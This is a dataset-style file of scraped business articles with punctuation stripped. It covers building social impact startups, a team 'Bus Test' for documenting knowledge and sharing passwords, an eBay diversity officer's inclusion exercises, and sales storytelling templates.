7,business,How to Build an Impactful CompanyThe number of social impact startups has risen dramatically in the last few years  And who can blame them  The job of the entrepreneur is to solve problems  and the biggest problems that exist are those that affect everyday people  Even companies that aren t mission driven at their core are fighting the good fight  from hosting company wide volunteer days  to partnering with nonprofit organizations  to working with local governments for social causes  and more   And what s better  there are now more investors looking to invest in impactful companies than ever before  which means that there is no better time to launch a world saving startup than now   But is it enough   In 2011  entrepreneur  investor  and philanthropist Peter Thiel famously declared   We wanted flying cars  instead we got 140 characters    His belief was that technological innovation was evolving at a slow rate  and that the world needed more ambitious entrepreneurs to tackle larger problems rather than merely building new apps and social media platforms  And while the finer points of his argument are up for debate  click here for his full manifesto   there is no denying that more entrepreneurs should be taking a stand against the challenges that face our future   If you are one of those founders who s ready to take the next step toward make the world a better place for everyone  you ve come to the right place  as this extensive guide will show you what you need to build an impactful company   Getting Started on Your Social Startup  Once you ve decided to launch a startup with a social inclination  there are a few considerations that you must keep in mind before committing to your venture  In the VentureBeat article   How to build a world saving startup   Rob Wu  founder and CEO of CauseVox  and Graduate of the Washington  D C  Founder Institute   offers some advice for aspiring social entrepreneurs looking to start impactful companies  Below are two of the biggest points   Put the Business First  As counterintuitive as it may seem  it s important to remember that you are still building a company that requires a scalable business model to survive and grow  During the formative stages of your company  ask yourself these questions   Who exactly is the demographic I am trying to help   How big is my target market and is it big enough support a startup   How much will my customers pay to purchase my product or service   Conduct extensive research into your target market by interviewing similar companies  charities  and nonprofits  and constantly monitor how your customers interact with your company and offering   Don t Quit Your Day Job Yet  Startups have a very high fail rate  so Wu recommends that aspiring social entrepreneurs to keep their current jobs before committing fully to launching a startup  Why  Because most startups die at an early stage  you need to make sure that you can keep your company funded yourself before it s strong enough to focus on full time   However  there are a few possibilities that can you can take advantage of to help you grow your startup while keeping your day job  depending on where you work   Take a sabbatical  Taking an extended leave of absence from your job enables you the opportunity to explore your passions and side projects without fear of losing your job   Look into Corporate Social Responsibility  CSR  Programs  Some companies have programs that help employees participate in mission driven activities outside of the office   Do some volunteering  Quite a few corporations pay their employees to do outside volunteer work  which is a great way to learn about your market and meet potential customers   Start a Nonprofit   If you re looking into starting a nonprofit organization  remember that if your current startup isn t generating any profit  you can t simply turn it into a nonprofit  Here are the key elements of a nonprofit company  according to the article   How Is a Nonprofit Different from a For Profit Business     Nonprofits undertake activities whose goal is not primarily for profit   No single person owns shares of the organization or interests in its property   The nonprofit s property and income corporation must never be distributed to any owners but are recycled back into the nonprofit corporation s public benefit mission and activities   Build Your Team  While countless founders dive into the world of entrepreneurship primarily with the goal of attaining instant fame and wealth  you may be surprised that there are still plenty of like minded entrepreneurs out there who are looking to solve a problem just like you  In fact  launching a social good startup pretty much requires you first form a team who are as dedicated to a mission as you are   With the creation of social impact startups on the rise  more and more related organizations are forming to keep up with the demand  Here are a few resources for founders looking to connect with other socially minded people   Pitch Your Social Startup  When you have a company that s up and running  you ll most likely need additional capital to expand  which means you may have to pitch your company to investors  Now  there are nearly countless resources available on the internet that cover how to craft a pitch that will win over investors   and many of them are useful   but when it comes to pitching a social good startup  there are other considerations that need to be taken into account   Fortunately  the fine folks at Securing Water for Food cover what socially minded investors look for when interviewing entrepreneurs  in their article   The Art of the Pitch  How Startup Social Enterprises Pitch Impact Investors  Devex Impact    Here are some of the most important things to keep in mind   Focus on the Story  Instead of going down the usual route of describing what your company does  how it works  who its customers are  and the expertise of your team  instead turn your pitch into a story by describing the overall social issue you re trying to solve  how it affects the average person  and what your company does to solve it   Detail a Plan to Scale  Event the most philanthropic investors are attracted to companies that have the capacity to grow  Before you pitch your startup to investors  ensure that you have a scalable business model and that you are able to accurately convey its potential  It s okay if your company is starting small and only catering to small number of people  but if you re still only serving that same set of people five years down the line  don t expect any investment anytime soon   Brand Your Social Startup to Get Customers  While it may be true that the vast majority of consumers aren t as interested in social causes as they are in  say  apps that make their lives easier  there is a growing number of people that are drawn to companies that offer solutions to social problems  So  just because your startup doesn t produce a fun new app or shiny piece of hardware  it s still possible to attract a sizeable audience   In fact  the Startup Grind article   How Impact Businesses Use Storytelling to Build Movements   by Rohan Potdar  dives into the various ways that social startups employ a personal narrative to boost awareness and drive engagement  According to that article  these are some of main components to an effective story based branding strategy   Be Real  Your company s marketing campaign should feature real people in real situations to establish trust with your audience while clearly describing the problem your product or service solves   Be Positive  The visuals of your marketing campaign should exude positivity  so it s important you focus on themes hope in the face of despair  triumph over adversity  etc   as this will portray your company as a viable solution   Be Meaningful  Only use visuals and messaging that are relevant not only to your company  but are relevant to the social problem your company is solving  Highlight the impact that you are creating and its importance to the society at large to establish credibility   Fund Your Social Startup  Raising funds for any startup is hard  but because social enterprises can be a hard sell  raising funds for a startup with a social mission can be even more difficult  However  don t despair yet  as there are still plenty of funding options for you and your social startup  you ll just have to work a little hard for them  that s all   According to Rob Wu in his previously mentioned article  these are some of the best methods and resources for aspiring social entrepreneurs   First customers  There are a couple of ways to capitalize on the revenue from your first customers  For example  you can charge upfront for your product or service  or you could do pre sales to help cover manufacturing and distribution costs  What s great about these tactics is that you can also test pricing strategies and revenue models while bringing in funds   Fund it yourself  While this is definitely a more expensive and risky route  sticking to your day job to save money for your startup nonetheless does have one major upside  you get to keep 100  of your company  a stark contrast to exchanging a percentage of your startup for investments   Raise investment rounds  As previously stated  relying on angels and venture capitalists for funding will mean that you have give up part of your company  However  the amount of money that raise from investors is significantly higher than self funding or your first customers  Also  there are plenty of investors out there who specialize in social enterprises  including   Omidyar Network    Kapor Capital    Investor Circle    Impact Venture Capital    Better Ventures    Ananda    Dream Labs    Root Capital    Vital Capital  Stay True to Your Values  If you ve settled on your mission and are seeking funding  don t alter your vision simply to attract the interest of investors  While sticking to the values of your company may make it more challenging to find investors that are looking to invest in startups like yours  it s better to hold out for a investors whose values align with yours and will contribute value to your venture that goes beyond mere capital  However  if you associate with investors who don t sympathize with your mission or if you change your values just to bring in investments  you will only increase the chances of conflicts of interest later on  which will be catastrophic for your company s success   Join an Accelerator  Accelerators foster the growth of early stage companies  and usually offer some sort of mentorship  office space  and funding  Like investors  while many of them are geared towards highly lucrative startups  there are still plenty of them that cater to social enterprises  Here are some top accelerators that are interested in impact startups        People in a Meeting and Global Network Concepts image by Shutterstock 
8,business,The Bus Test        The Startup   MediumThe Bus Test      A simple test of how disaster proof your business is  One day  Crew CTO Angus Woodman and I were walking home  yes  we walk home together sometimes   deep in conversation about some important  world changing feature for Crew and as we stepped off the sidewalk a bus went flying by  narrowly missing Angus by only a few inches   Without Angus  yes  the company s average age would have been considerably lower  I m calling you old  Angus   And yes  the company s Slack messages would have been a little more politically correct  But who would have written all the backend code that keeps Crew running smoothly   Who would have handled the deployments   Who would have ripped apart our Github pull requests   Who would have named the Github priority labels Priority Weak Sauce and Priority Hot Sauce   Okay  so the bus thing never happened  though we do walk home together sometimes   so what    but we did  at some point for some reason  think about the problem of having knowledge only exist in one teammate s head   If something happened to that person  like  say  they get hit by a bus   how would we keep moving forward   We named the principle the Bus Test  as it sounds a lot more exciting  albeit slightly more macabre  than the Somebody Takes a Vacation Leaves Crew Test   How to run the Bus Test  The Bus Test is a simple principle    Knowledge should be duplicated between multiple team members    Knowledge doesn t just mean facts and history  it also means processes  development  and access to accounts  to name a few   Things tend to get more complicated as you grow and over the past year  we ve made a big effort to duplicate  document  and organize Crew s knowledge  Some of it we re still working out  but here s a little behind the scenes look at how we re trying to spread knowledge between teammates   Account sharing  There was a dark time where we shared accounts either by   Using the same email password combo  yah  that was a thing     Sharing the old school way   Hey Steph  whats the login for Skype again     It was slow  insecure  and most of all  it didn t pass the Bus Test   One person gone and poof no more logins   Meldium  no  not Medium  is a tool we started using to share passwords securely between teammates  It has a bunch of useful features  but the most important one is that Crew related accounts  think Twitter  analytics  developer tools  etc   are accessible to everyone on the team   When we sign up for a new account on some service  we add it to Meldium   If a password needs to be reset  we update it in Meldium   As soon as we update an account or password  Meldium makes sure to automatically share it with the rest of the team   It s quick  it s easy  and it passes the Bus Test          Processes  Processes sounds like one of those words that you try to stay away from at a startup   they re for slow  boring  old people  right  Or at the very least  you try minimize them  that s what I always thought    However  a few months back  it became obvious that we did have processes  We d just never documented them   They weren t formalized and they weren t easy to discover  They were the equivalent of the  Hey Steph  whats the login for Skype again   problem  but at a much larger scale   We were wasting time and we were making it hard for new teammates to pass the 4AM Test  oh yeah  that s another test we ll talk about in the future   Worst of all  they didn t pass the Bus Test   Stephanie Liverani and Mikael Cho were the first ones to figure out that we needed to properly document how we do everything from writing a blog post to creating a new product  and so we brought all that information together in the appropriately named  Processes  board on Trello   The premise of the board is simple  any repeatable action  aka  a process  should be documented and assigned a lead   The lead is responsible for updating the process when it changes and answering any questions about the process   Everything from on boarding new teammates to IT issues to filing an expense is documented on the board  It s the first place you look when you don t know how to do something and it s the last place you look when you re looking for something fun to do on a Saturday night   Trello process card for Meldium and passwords  so meta   Most importantly  it takes the knowledge out of one person s head and shares it with the rest of the team  Bus Test passed          Development  The hardest thing about development is understanding product context  let s start a flamewar Hacker News   It s fairly easy to understand how a feature works  but understanding why it works that way and the thought process behind that choice is the hardest and most important part of product development   I ll give you a quick example  though  feel free to skip it    On Unsplash there are two types of tags for a photo  a suggested tag and an authoritative tag  Suggested tags are created by the community and authoritative tags are created by our team  There are three types of suggested tags  auto tags  created by an algorithm   community generated tags  and the tags created by the photo s photographer  There are two types of authoritative tags  primary  for example  this is a picture of a cow  and secondary  this picture contains a cow  but it isn t only a cow    It s not simple  right   For any developer who wasn t a part of creating that system  it s confusing  complex  and when you read the code  you get it  but you don t understand why it was done that way  I swear  there was a reason    Communicating that knowledge is crucial when it comes to fixing bugs  improving the feature in the future  and for not thinking your fellow teammates are complete idiots  If that knowledge only exists in the original developer s head  well  the rest of us are sh t out of luck when that person isn t around   We re still working out the best way to communicate that knowledge  should it be in a wiki  in the code itself  in Trello  or in Github     Right now we re using a combination of tools to make it happen but that might change  and probably will change  in the future   The main outcome is that the knowledge needs to be written somewhere  Github pull requests are a good place  the dev channel on Slack is another  and the codebase is probably the best   Unlike the other areas  we sort of pass the Bus Test for development  but it s something we re definitely going to figure out  whoever is the lead on that process Trello card has a fun year ahead of them         
9,business,eBay s First Chief Diversity Officer on Humanizing Diversity and Inclusion I m not going to give you the solution to diversity and inclusion in tech     I don t have any D I data for you     I m going to ask you to leave your  representative  behind today    These are not the disclaimers you might expect from eBay s first Chief Diversity Officer  who held roles at Google as its Diversity Strategist and at Uber as its first Global Head of Diversity and Inclusion  But Damien Hooper Campbell isn t your traditional leader when it comes to his approach to diversity and inclusion  Each step in his life and career   from front of the house manager at an organic Chinese food restaurant in Harlem to Assistant Director of Admissions at Harvard Business School to Vice President at Goldman Sachs   has shaped how he views diversity and inclusion  whether it s through hospitality  education or its manifestation in some of the most influential industries   Drawing from his First Round CEO Summit talk  which received a standing ovation  and follow up conversations  Hooper Campbell shares how he believes we can humanize an increasingly popular discussion that s otherwise at risk of becoming a rote phrase in tech  diversity and inclusion  D I   He shares a snapshot of the state of affairs of D I in technology and suggests how it can be approached differently to generate more authentic  effective and   wait for it   inclusive conversations  Lastly  he offers a few exercises and tactical takeaways that every leader can try at her organization    Literally  Searching for Diversity in Tech  Let s start by getting a quick  unscientific pulse of how D I is being covered before jumping into what should be discussed  If you ve ever Googled  diversity in tech   you ll get a smattering of headlines  such as these   Imagine how entangled this issue can be if there s this level of contradiction and questioning in the headlines   It took just minutes of searching to come up with these titles and more  What s happened with this conversation  It s supposed to be about people and something good  In many ways it s become a bastardized  sticky conversation to have   says Hooper Campbell   Add in the backdrop of the United States and the racially polarizing acts that we re seeing happening across all of our cities  Add in the backdrop of what s happening in the UK with Brexit  Add in the backdrop of what s happening in Germany with refugees  This has not become the most fun discussion to have  It s not for lack of trying to start the conversation    The Current State of Affairs  The intensity and complexity of the issues involved in conversations around diversity and inclusion has sent the tech sector in a number of different directions in search of meaningful change  Hooper Campbell has noted some common patterns   D I leadership roles   We hire a Chief Diversity Officer    Progress via percentages   We double down on recruiting because there is a narrow and almost singular definition of progress as having a higher percentage of women  of Blacks and Latinos than you had last year    Formal trainings   Many of us do D I programs  Usually it s in the form of trainings  For example  unconscious bias has become the buzzword of the last few years  Training after training takes place  People who are underrepresented minorities feel forced to speak up and represent more than their individual feelings  and people who might not self identify as underrepresented minorities are sometimes scared to speak at all in fear of saying the wrong thing    Take A Different Step First  It s not that Hooper Campbell believes that investments of money  resources and time is ineffectual   it s just usually that they re often applied in a silo without considering the human element that is at the foundation of this conversation   It will seem clich  to some or too simple to others  but the first   and most often skipped   step is to humanize this issue  This is not just about metrics and percentages  Yes  ultimately  those are absolutely necessary for progress  But what I m going to ask us to do is to put the trainings aside for today  Toss out the money for a second  too   says Hooper Campbell   For those of you who have been afraid to talk about it with your teams  go through the following steps so you can encourage them to join you  too  This is especially important for leaders of early stage startups because you have the best opportunity to make a change here  I m going to push you to have a conversation  so you can push them to have a conversation  It s not rocket science  Let s kick this off    Damien Hooper Campbell at First Round s CEO Summit  Redraw the Circle of Trust  This phrase  Circle of Trust  became most popular thanks to Robert De Niro s character in  Meet the Parents   As a reminder  De Niro plays the cynical father   and former CIA agent   who believes no one is good enough for his daughter  especially her current boyfriend who is meeting him for the first time   The boyfriend  played by Ben Stiller  is desperately trying to make a good impression  but he stumbles all over himself  The most infamous scene is when Robert De Niro corners him and introduces the  Circle of Trust  concept  He talks about how his entire family is in it  how he knows Ben Stiller is trying to get in the circle and that he s watching him   says Hooper Campbell   The point of bringing up this movie is twofold  First  go see it   it s hilarious  But second  most of the time  we don t know each other  Whether it s at conference  at a company that skyrockets from 20 to 2 000 people or on a commuter train  we are often in environments where we see but don t know each other    The goal is to draw wider Circles of Trust   faster   The challenge is that even among those we see every day   for hours and hours at a time   we don t get beyond those surface level conversations   says Hooper Campbell   Even among those we know  we choose not to dive deeper when we re at work  Most of us join companies and bring  our representatives   You know what I m talking about  What we need to do is push beyond the boundaries of surface level conversations  We need to do what we very rarely do as human beings when we first meet each other  We need to be okay being politically incorrect for the moment as long as we ve established an assumption of good intent  That allows us to get our real views out there and gives us permission to call BS when we see it    Being in the Circle of Trust is like being in the exit row on a plane  You need verbal confirmation before proceeding   Define Diversity and Inclusion   But Parse Them First  The point of the Circle of Trust is to quickly create an environment that is conducive and safe for open conversations about diversity and inclusion  The first thing you want to do is define the topic in your own terms  What does diversity actually mean to you   It doesn t have to be perfect prose   the process of sharing definitions is what s powerful  Break your team into pairs of people to do this definition exercise   What I m not looking for is what does it mean as defined by the dictionary  Or what it means as defined by what you think people want to hear or what the media says   says Hooper Campbell   What does it actually mean in your world  That s where I want you want to start    Reconvene your team and ask for volunteers to share  Let there be moments of silence  if they re needed  As the leader  give your definition  too  but not before a handful of your people do  The answers will range  Here are some sample responses that your people may share    It means to me a people who come from a wide  diverse background and places  Diverse backgrounds mean various experiences  whether that s life experiences  job experiences or regional experiences     We all have cognitive biases  We all have things that we carry with us  It s our baggage  Diversity to me means I want people to bring that wide variety of baggage     It means not letting your culture be defined by a single or few narratives    Come on  folks  Let s define  diversity   Remember  we said Circle of Trust  We said no BS  We said no surface level stuff   Here s what I ve noticed  conceptually  most us get what diversity means   It s everything   says Hooper Campbell   Oftentimes  this conversation narrows to be about only race and gender  While  yes  race and gender are very important aspects  diversity goes well beyond them  It absolutely should include them  but goes even further into hundreds of attributes    Damien Hooper Campbell  Next  define the other word  inclusion   What does this word actually mean  Again  I don t want you to do what we typically do which is just define  inclusion   Forget Merriam Webster   says Hooper Campbell   Again  break into groups of two   make sure people are paired with new partners   and give them this prompt to ask each other  Dial back in your own life to a personal event when you felt excluded   regardless of when or why    Now these conversations don t have to be about race or gender or age or sexual orientation  but they absolutely can be   no judgement here   This could be from when you were four years old and you didn t get picked for the kickball team  This could be from earlier today when you realized that people at your company held a meeting and didn t invite you  It doesn t matter what it is   says Hooper Campbell   I just want you to talk openly and candidly with the person across from you about a time in your life when you felt excluded  Before you finish  come up with a couple of adjectives that describe how you felt at that moment  Go    There ll be buzz in the room  You ll find that most will be so engaged that they won t hear you say that time is up  But  again  regroup as a team and ask for a few brave volunteers  These answers won t just be responses   they ll be stories of the human condition  Let them unfold and don t tolerate interruptions  Here are some sample responses that Hooper Campbell has heard    I was fat as a kid  The things that I thought were important  like school  weren t what others thought were important  like sports  The majority didn t care about what I did  Whatever everyone thought was important was how people judged popularity  That was a multi decade recurring theme for me  My adjectives are  loser  and  lonely      We shared very similar stories  which is why I feel confident or comfortable sharing  We both recently had friends   not close  but not acquaintances   who had weddings recently  to which we weren t invited  Both of us expected we might be invited to them  It wasn t necessarily a deep exclusion   compared to what s been said   but it still prompted some insecurity  It made us wonder if we weren t as good of friends with those people as we thought  My adjectives are  insecure  and  fear of not being missed      My experience was in high school  I was on our soccer team  There would be these big parties over the weekends when someone s parents were out of town  It was really awesome except I would always hear about it on Monday after they happened  Nobody told me or invited me  It was always one of these things  My adjectives are  sad  and  unwanted      I went to high school in Japan  I was on the math field day team  I was the only girl  I was the only non Japanese person  My teammates would literally just speak Japanese in front of me like I wasn t even there  This exercise reminded me of that and the feeling of just not even mattering that I was there     Mine s about age  In the first few internships I had  I walked in the front door and said   I have a million ideas on how to make everything better   I immediately got shut down  It happens a little bit less now  but I still remember it  I was the youngest person around and getting shut down  My adjectives are  crippled  and  demotivated     What s Being Shared  What s Being Said  The experiences shared through these exercises will naturally bring your team together   maybe in ways you can t immediately diagnose  To conclude  ask yourself a few questions   How would you describe the type of exclusion shared   Notice something about the experiences mentioned  They won t necessarily have to do with race and gender only   says Hooper Campbell   Those experiences were about human beings regardless of backgrounds or attributes   it was about those who have felt excluded    What were the words you heard   Insecure  fear  lonely  right  Crippled  demotivated   says Hooper Campbell   These adjectives aren t mutually exclusive to any one category of people    From when did these stories come   It d surprise me if a handful of the stories told were not from childhood or teenage years   says Hooper Campbell   In the previous examples  there were stories from grade school  high school and early in one s career  These are clearly long lasting  strong feelings that have made a deep impression    The power of these exercises is that suddenly the stories that get voiced belong to the people you see often  It s a step toward truly knowing them   and making them feel welcome  It s also a step towards getting more people involved in the conversation on and commitment to diversity and inclusion  While an experience of being overweight may never be the same experience to being excluded because of the color of your skin or gender  it should help all of us get a bit closer to making  inclusion  less of a buzzword and more of a human experience   Folks  the point of this is there are people who are working for you right now or are trying to work for your company who feel this way   says Hooper Campbell   If you ask for a show of hands of those who have ever felt excluded  you ll see many  many more  Nearly every person has felt excluded at least once in their life  Now ask your team  How many of you have ever been responsible   intentionally or unintentionally   for excluding someone else  If people are really in the Circle of Trust  you ll see just as many hands go up    Keep Those Hands Held High  Ask your team to keep their hands up for a few minutes more   That s what you want to fix at your organization  I m not asking you to start with a training  I m not asking you to take money and throw it at the problem  I m asking you to simply start with a human conversation and a commitment to use your positions of leadership to never knowingly   either directly or indirectly   allow anyone in your sphere of influence to feel the adjectives of the excluded   says Hooper Campbell   If you still aren t getting this diversity and inclusion idea  consider this metaphor   which is not mine  but I love it and so I continue to use it  Diversity can be likened to being invited to the dance party  We all open up our texts or email and have received an invitation to the party     So fast forward and now we re all standing around at the party and there s tons of diversity in the room  Awesome  But that s only part of the equation   says Hooper Campbell   So what if only people of a certain weight are dancing  Or only certain people who are close enough friends to be invited to the wedding who are dancing  Or only people of a certain age who are dancing  Or only people who speak a certain language who are dancing  Or only people who are cool enough from the soccer team who are dancing  Inclusion is getting asked to dance when you re at the dance party    Folks  diversity alone isn t enough  If diversity is getting invited to the dance party  inclusion is being asked to dance when you re at the party   The message here is that diversity alone isn t sufficient   As leaders  it s great if you re trying to recruit people from diverse backgrounds  But that s just table stakes as one of my colleagues says   says Hooper Campbell   I challenge you all to get rid of the noise that focuses all of this conversation on recruiting and statistics alone  That s a major part of it  We call that workforce  We ve heard it already  We ve heard it tons of times  A diverse workforce helps with profits and business because many of our customers and end users reflect a broad array of diversity  Okay  Got it  But what about the workplace  How do you actually feel when you re there  Have you only been invited to the dance or are you also being invited to dance when you re actually in the workplace    Damien Hooper Campbell at First Round s CEO Summit  A Challenge for Your Company  Run these exercises at your startup   start with this conversation to gain important ground if you value diversity and inclusion   This type of thinking will blossom throughout your company as it grows  You ll likely give voice to employees you ve been missing out on  Or customers you re not welcoming onto your platform   says Hooper Campbell   Because you re now thinking in a more inclusive way    In summary  here are a couple takeaways to try immediately with your people   Start with a conversation   You can bring in experts to talk about unconscious bias all day long  You can hire a Chief Diversity Officer   for the record  I m grateful  But have you actually had a real conversation to understand what diversity and inclusion means to your people and peers   asks Hooper Campbell   Do you know  Maybe it is about physical appearance  Or about languages  It s probably also about race and gender  but don t miss out on bringing people into the conversation because  by yourself  you ll narrowly define diversity and inclusion    Demand that inclusion be inclusive   Diversity and inclusion can easily become a very U S  centric conversation  Just because you start to decipher what diversity and inclusion may mean in the U S  does not mean you ve identified what D I means in France or Ghana   says Hooper Campbell   By having the conversation and listening  you get what you need to figure out where to meet people in the dialogue    Keep the aperture wide to counteract polarization  Diversity and inclusion is an all encompassing set of ideas   and participants   We ve gotten to a place in this discussion around diversity and inclusion where we have awesome initiatives that are focused on certain populations   says Hooper Campbell   But what good are those initiatives if people in the majority don t feel welcome in that conversation  If it s simply an initiative inside of your company that s focused on women  that s fantastic  But include and encourage men to participate  Otherwise  they say   I m not going in that room   How will the needle move with that type of fragmentation    Own D I language before you own metrics  If you are intent on measuring the efforts and efficacy of these conversations  there s a good early litmus test   If you are at a place in your organization where you don t know if you should call me Black or African American  get to a place by having a conversation where it s okay to ask that question   says Hooper Campbell   Also  if you don t know if you should say homosexual or gay  get to a place where you can ask that question  The worse thing you can do is say nothing at all    Find the business case   I want you to find the business case for diversity and inclusion in your company  I m telling you  it exists  Diversity and inclusion drives revenue  Forget any research study for a second  This should be foundational  Find the opportunity in your business model   says Hooper Campbell   At eBay  diversity and inclusion is core to our business model  We re driving economic empowerment for sellers from every corner of the world while also offering over 1 billion selections to meet the needs of an extremely diverse set of buyers  If we don t focus on this  our business doesn t grow    Progress comes with vulnerability   I ve coached leaders for years  The biggest Achilles heel I see with senior leaders   those with big salaries and titles   is an inability to be vulnerable and a pressure to appear perfect   says Hooper Campbell   With these inclusion conversations  that has to change  Folks  it s that conversation   that exchange about exclusion   that s the real takeaway  In less than an hour  you can fast forward past political correctness and surface level conversation  You can talk to each other about something that we all have in common and can connect with each other on immediately  feeling excluded    Whatever you do  include  Commit to never ever  doing anything   knowingly   to let the people who are in your sphere of influence feel excluded  The health  happiness and longevity   of your people  business and industry   is in the balance 
10,business,The Three Frameworks You Need to Kick start SalesThere can be a mystery to sales at the earliest stages of a startup  Wise counsel on building a strong sales deck or designing sales onboarding exists  but when it s just an impassioned founder or salesperson drumming up leads pre launch  advice is often ambiguous and reduced to flexing a  go get  em  attitude  It s enthusiasm for an idea that ll engage your early customers  but this isn t uncharted territory without tested tactics for growth   With more than a decade of startup sales experience  Whitney Sales  expertise might as well be her last and middle name  Creator of the The Sales Method  she supports founders who need a seasoned sales executive early on  She s currently the VP of Sales at TalentIQ  but has been in sales leadership roles across a range of startups  At Wanelo  Sales and her team sealed 200 partnerships   including Nordstrom  Urban Outfitters and Sephora   in just eight weeks  Within a year of leading sales  she helped SpringAhead rise to  567 on the Inc 5000  At TalentIQ  Sales has generated over  1 3 million in pre launch sales in under eight months   If your startup is still building its early sales function or tallying its first deals  it must approach sales differently  According to Sales  early stage companies need to place more emphasis on their founding narrative  customize their customer stories and integrate both seamlessly into a structured prospect pitch  Here  she deconstructs each area with exercises in a step by step  minute by minute format  Let s get started   No customers  Pull from your beta users  Not yet  Draw from the startup s origin story  There s always a seed   Before diving into creating a use case through a founder or customer story  Sales underlines two key differences around sales for early stage startups  target customer and company validation  On the former  she says   The buyer for an early stage company is going to be different than the one buying established enterprise products from Microsoft  Oracle or GE  As an early stage company  you re generally selling to a targeted group of early adopters  founders and entrepreneurially inclined experts  who can be from small companies or larger  established organizations  You re looking for people with a very particular mindset  You re seeking the early adopters  people on the hunt for new  fresh approaches to solving problems in their markets  This mindset comes with a lower barrier to entry  higher threshold of forgiveness and an active feedback loop as your company finds its way  This customer is buying a product because it s innovative  different and they want to be the first to find and test your product before others do    When it comes to company validation  before the sales function of an early stage startup has product market fit or paying customers  it has an origin story   The narrative of how the founders came up with an idea for a product and the feedback they received from their first customers  This narrative is the validation for a company s and product s existence and is something every company has  To abandon these stories is to neglect why you decided to build a company in the first place   says Sales   The inception of any company is inevitably linked to the challenge the founder first faced and addressed  This part of the narrative is too often forgotten and it s key to connecting with a customer    Go earlier than Steve Jobs in the black turtleneck  Invoke him in the calligraphy class when he realized that fonts were a big deal   and what that meant for the first Apple customers   HOW TO CONSTRUCT A VALUE BASED FOUNDER STORY  In the hustle to grow  too often early founders overlook their initial reason for doing so   to Sales  this is a critical mistake   A lot of the time young companies don t even talk about their founding story  they don t think it s important  They see a sales call as a sales pitch in its classical dramatic interpretation   the Glengarry Glen Ross monologues   and that s not what sales actually is  especially not these days   says Sales   It s more involved  It s about being able to relate to people and the challenges they face on a daily basis  If there is a solid fit for the prospect you re engaging  they ll share the challenge you address   that itch you first needed to scratch so badly that you decided to dedicate years of your life to relieve    Value Based Founder Story Template  The following exercise is designed to help tell your origin story and impart common ground with a prospect   and to establish a connection with potential customers through shared pain points  Here s an example  using Sales  current company  TalentIQ  as a model   Our founder  Sean  started his first company in college three years ago  He was looking for an Android developer for an app and sat down with a recruiter to outline what an ideal candidate would look like  The recruiter said she d get back to him with candidates shortly  Sean soon learned that  shortly  meant  ten days   By the time the recruiter sent over candidate profiles  Sean had already sourced his own candidate  translating to thousands in lost business for the recruiter   Knowing recruiters work on commission  he wanted to understand why it had taken so long to send candidates  She showed him her screen  which had 50 tabs open  each representing different aspects of a candidate s online profile and work history and living in a different system of record  He realized that recruiters are missing one place to go for key  up to date candidate information  Investigating further  he learned that this challenge exists for most workflow management tools  None of them track people  they just track activities on people  There wasn t a simple way to keep a person s online personal and professional footprint up to date in workflow management tools recruiters  salespeople and marketers use everyday  As a result  he developed TalentIQ   This example can be abstracted to this basic template    SUBJECT   ONCE UPON A TIME    SITUATION   CUSTOMER PROBLEM    CUSTOMER  and realized  FEATURES OF PROBLEM    COST    SUBJECT  learned  IDEATION PROCESS   As a result   SOLUTION    Use the following key to create your value based founder story with the template   SUBJECT  Who is the main character of the narrative  You  your founder  a friend  colleague or previous employer  Example  Our founder   Sean   He  ONCE UPON A TIME  When did this happen  What was going on at this time  Example   Started his first company in college three years ago   SITUATION  Set the stage  Describe the scene  Example   He was looking for an Android developer for an app and sat down with a recruiter to outline what an ideal candidate would look like  The recruiter said she d get back to him with candidates shortly   CUSTOMER   Describe your target market or characteristics that match your current prospect  Example   The recruiter  She  PROBLEM   Describe the problem  Example   Sean soon learned that  shortly  meant  ten days    FEATURES OF PROBLEM  Recruiters work on commission  he wanted to know why it d taken so long  She showed him her screen  which had 50 tabs open  each representing different aspects of a candidate s online profile and work history   each living in a different system of record  He realized that recruiters are missing one place to go for key  up to date candidate information   COST  How does the problem translate to time or money  Example   By the time the recruiter sent candidate profiles to Sean  he s already sourced his own candidate  translating to thousands in lost business for the recruiter   IDEATION PROCESS  Identify the process of understanding what the need is and hypothesis what is need to fix it  Example   Investigating further  he learned that this challenge exists for most workflow management tools  None of them track people  they just track activities on people  There wasn t a simple way to keep a person s online personal and professional footprint up to date in workflow management tools recruiters  salespeople and marketers use everyday   SOLUTION  Keep this brief  It is about you  not what you do  Ta da moment  Example  As a result  he started TalentIQ   Whitney Sales  HOW TO CONSTRUCT A VALUE BASED CUSTOMER STORY  A founding story is just the first step to helping your prospects understand the problem your product solves  However  the founder s challenge is not always everyone s   your potential customer may be able to relate more to the use case of another customer like her   For every customer you are talking to early on  you should have an engaging story of another company  like her  whose problem you solved   says Sales   If you only have one customer  extract the elements of their use case that are most relatable to your prospect  If you don t have a paying customer yet  use a beta customer  If a customer is not paying  that doesn t mean you re not providing them with value  it s just a matter of understanding what that value is  A beta customer s story can be as valuable as a paid customer s story to your prospect    As you convert prospects to paying customers  your number of use cases and customer stories will naturally grow   After getting your first use case  the next milestone is having a set of three to four to pull from  You want to have each use case and customer story to reference for each of the target markets you re going after  Know the unique attributes of each customer  the problem your product solved  and how your product solved that problem in detail  Look for use cases that exhibit a range of customer attributes   such as size  region  industry or tech stack  Map unique identifiers in your story that will resonate with your prospect   says Sales   As your base of customers and prospects grows  segment your customer stories by the previously mentioned customer attributes   At around 20 40 sales conversations  you ll have a better sense of your target markets   and a selection of customer stories that illustrate solutions for the problems of each market   says Sales   As a small company  if you re building a customer use case each quarter you re doing a great job  You re doing phenomenally well if you re adding one solid story a month  Each story represents a validated use case for a market and potentially a new set of customers to target    Value Based Customer Story Template  The following exercise is designed to help construct a value proposition for your prospects through the use of customer examples   The objective is to relate to your prospect s pain points and how your product or service has already successfully helped similar companies  Value based customer stories are used to overcome objections and build credibility for your company and its offerings   says Sales    As your set of customer stories grows  I recommend constructing rich value based customer stories for each of your customer segments and products or services    Here s an example   One of my clients  XYZ Scalability Corp  was having the same problem  When I met with its VP of Marketing  they mentioned that cancellation rates during onboarding had increased 12  over the last three months  Retention rates were dropping and the company s reputation was suffering  They believed this was a customer communication issue during onboarding  Onboarding emails weren t targeted to where a user was in the onboarding process  resulting in low click through rates  high unsubscribe rates and eventual cancellation   We implemented our automated behavioral email marketing and enabled XYZ Scalability to email their customers based on behavior in the product  This allowed XYZ to send personalized emails to their customers based on their specific onboarding path  Two months after we implemented automated behavioral email marketing  we d reduced the time to convert by 30  and increased overall conversions by 63   which translated to 4 2M in revenue for XYZ   This example can be abstracted to this basic template   One of my clients   CUSTOMER NAME   who is in the same  QUALIFICATION CRITERIA   was having the same problem  When I met with their  TITLE   they mentioned that  EXAMPLE OF CUSTOMER PAIN POINTS     ADDITIONAL DETAIL    